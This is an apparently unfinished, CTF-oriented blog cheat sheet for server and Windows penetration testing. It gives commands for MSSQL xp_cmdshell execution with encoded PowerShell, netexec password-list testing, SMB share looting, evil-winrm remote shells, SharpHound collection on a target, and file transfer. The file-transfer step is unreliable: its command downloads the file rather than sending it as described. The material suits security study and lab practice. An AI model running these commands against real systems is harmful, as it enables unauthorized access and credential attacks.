---
published: False
layout: post
title: Server & Web App Testing Cheat Sheet
date: 2025-03-10
description: This is a cheat sheet for web app testing. It is a summary of techniques for obtaining various types of information and testing various parts of web apps.
tags: forensics memory storate image cheatsheet
categories: Cheatsheets
thumbnail: assets/img/cs-windows/thumb.webp
toc:
    sidebar: left
---

<style>
    .small-margin > * {
        margin-bottom: 0.1rem; /* to make image figure titles be a reasonable distance from the image. */
    }
</style>

**! Disclaimers:**
1. *All identifiable information on this page, including IP addresses, names, dates, and locations, is fictional or sourced from CTF-style challenges. Any resemblance to real-life situations is coincidental and does not pertain to actual individuals, companies, or computers.*
2. *This cheat sheet is a continuing work in progress. I started it in late Feb 2025. I will add to it as I have time. If you notice any mistakes or obvious missing techniques, let me know and I'll add it.*


# Introduction
This is a cheat sheet for finding information on Windows systems. There are some others like it, but I couldn't find anything that provided the range of techniques I was looking for. 

## How to navigate this page
There are two good methods for finding what you need in the cheat sheet.

1. The best way to find something is probably to just ctrl + f for related words.
2. Failing no. 1, use the sidebar to browse for what you are looking for. 


# Information Gathering

## Port Scanning

### nmap

## Fuzzing HTTP

### Dirbuster

### Gobuster

### Feroxbuster

### Dirsearch
[Dirsearch](https://github.com/maurosoria/dirsearch) is a python-based directory fuzzer that comes packaged with a fairly good and short wordlist.

#### Installation

Clone their repo:

```bash
git clone https://github.com/maurosoria/dirsearch.git --depth 1
```

`cd` into the repo and install requirements:

```bash
cd dirsearch
pip install -r requirements.txt
```

Create a link to dirsearch.py somewhere in your path.

```bash
ln -s /home/radio/sectools/web-app-testing/fuzzing/dirsearch/dirsearch.py /home/radio/.local/bin/dirsearch
```

#### Usage

Basic Scan that returns reachable results:

```bash
dirsearch -u http://<url>/<path>/ -x 403,400,404 -t 50
```

```plain
-x CODES, --exclude-status=CODES
                        Exclude status codes, separated by commas, support
                        ranges (e.g. 301,500-599)
 -t THREADS, --threads=THREADS
                        Number of threads
```

### ffuf

# Connecting to open ports

## Impacket

[Impacket](https://github.com/fortra/impacket) is a collection of useful tools that can be used for more than just connecting to open ports with different protocols.

### MSSQL With Impacket

```bash
mssqlclient.py '<user>:<password>'@<IP>
```

Then use the following to execute commands on the system:

```bash
exec xp_cmdshell '<command>'
```

And the following to execute powershell scripts via a similar method:

```bash
xp_cmdshell powershell -e <base64 encoded powershell>
```

## netexec
A continuation of the `crackmapexec` project. Get it [here](https://github.com/Pennyw0rth/NetExec).

### Simple netexec Usage with LDAP
`netexec` can interact with many different network protocols, but here is an example of using it to connect to an open LDAP port with known credentials:

```bash
netexec ldap <IP> -u <user> -p <password>
```
### Simple netexec Usage with MSSQL

`sa` is the typical default admin account for connecting to MSSQL, but others could also work.

```bash
$ netexec mssql <IP> -u sa -p <password> --local-auth
```

`--local-auth` may not be required, but it sometimes is.

### Test out Windows credentials with netexec

If you have a username and want to test a list of passwords on an AD domain, use the following:

1. Put your passwords separated by lines in a file (passwords.txt in this case)
2. Run this command to test the password list for a given user
```bash
netexec winrm <IP> -u <user> -p passwords.txt
```
<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0 small-margin">
        {% include figure.liquid loading="eager" path="assets/img/cs-web-app/netexec-pass.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>
<div class="caption">
    Testing passwords with `netexec`
</div>


## smbmap
Map the drives available on an SMB server

### Usage

```bash
smbmap -H <IP> -u <user> -p <password>
```

## smbclient
Connect to SMB on port 445.

### Connecting
```bash
smbclient \\\\<IP>\\<share> -U <domain.tld>\\<user>
```
Then you will be prompted for a password.

### Getting data
To get a single file during an smbclient connection, use:

```bash
>get <file>
```

To get an entire directory, use all of the following:

```bash
>tarmode
>recurse
>prompt
>mget <directory>
```
## Evil-WinRM
You can use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to get a remote shell on a windows machine if it has WinRM available

### Install it with gem

```bash
gem install evil-winrm
```

### Remote Shell with user and password

```bash
evil-winrm -i <IP> -u <user> -p <password>
```

# Windows Eumeration

## WinPEAS

## BloodHound

[BloodHound](https://github.com/SpecterOps/BloodHound) is an AD enumeration tool.

### Install BloodHound CE with docker

Get the docker-compose.yml file:

```bash
curl -L https://ghst.ly/getbhce > .\docker-compose.yml
```
If your docker daemon isn't running, start it:

```bash
sudo systemctl start docker
```

pull the image and run it:

```bash
sudo docker compose pull && sudo docker compose up
```
It will randomly assign an inital password in the output

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0 small-margin">
        {% include figure.liquid loading="eager" path="assets/img/cs-web-app/bloodhound-pass.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>
<div class="caption">
    BloodHound randomly assigned password in docker output
</div>

### Access BloodHound

It should be running on your localhost, so visit [http://localhost:8080/ui/login](http://localhost:8080/ui/login). The username is `admin` and the password was randomly assigned in the docker output.


<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0 small-margin">
        {% include figure.liquid loading="eager" path="assets/img/cs-web-app/bloodhound-login.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>
<div class="caption">
    Logging into BloodHound
</div>

### BloodHound Queries
Once your data has been ingested, you will need to perform queries to return interesting information about the data.

There are some good queries [here](https://github.com/CompassSecurity/bloodhoundce-resources).



### SharpHound

[SharpHound](https://github.com/SpecterOps/SharpHound) is the agent that gathers data for BloodHound to analyze. You can get the latest release [here](https://github.com/SpecterOps/SharpHound/releases).

Get it to your target somehow, then run it.

# Move files

## From Windows to somewhere else

### With PowerShell & a server on a remote machine

Setup a python server on the machine you want to file to be transferred to:

```bash
python -m http.server
```
Send the file from the windows machine:

```cmd
powershell -c "Invoke-WebRequest -Uri http://<IP where you want the file to go>:8000/<filename> -OutFile .\<filename>"
```

You should see the request come through on your server and the file should be written to the directory of your server.